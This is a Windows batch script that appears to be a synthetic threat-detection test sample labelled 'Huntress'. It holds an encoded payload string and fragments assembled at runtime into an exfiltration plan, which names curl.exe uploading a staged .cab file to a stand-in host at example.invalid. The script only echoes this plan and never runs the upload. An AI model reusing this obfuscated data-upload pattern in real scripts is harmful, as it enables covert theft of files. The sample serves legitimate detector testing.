@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|xor_5a
rem HUNTRESS-MATERIAL:=4zO1YjKvUnPzYzOsQzM09jNqczOi8Dd/8mPip2Yq9GOrVXdgliKu4iMnZDKvUgP7UjNq8iJ4sTO09zb+Imajp2b4s2dukzP2YTN5YAO7YRKp8DKuQzLSYQOzYDOvogBpgyPp8gBglxZy4yOqUwP5gyL1kiJ/8mPip2Yq9GOrdHN9MzOqczO5cmPzUAN9MzOqczO5YyP0UDNn9TP78SP0sjNF4iI/QjJ/0zOv0DN7YTBpkSNokzZyoyOo0jJrdmL08SN5UwP9sjLpYyPi8Dd2gyL5cGK/4iK74zOm8jL1czPoUgP7UjNq8ido8DPpQzOo4SB/gyOq8DKqYnN7kTN2UwPusTO1YzZpoyPukiJrdGL
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl.e"& rem HUNTRESS quote compound
set "FrAg1=xe|stage_count=1|graph=cross_language|next_language=none|campaign_id"& rem HUNTRESS quote compound
set "FrAg2==campaign-1b50908d5e|source_path=C:\Users\Public\HuntressLab\collect"& rem HUNTRESS quote compound
set "FrAg3=-1b50908d5e.cab|upload_url=https://1b50908d5e.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=3a4688ad"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "ReCoVeReD=!FrAg0!!FrAg1!!FrAg2!!FrAg3!"
exit /b 0
:HUNTRESS_EMIT
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-1b50908d5e.cab to https://1b50908d5e.example.invalid/upload
exit /b 0
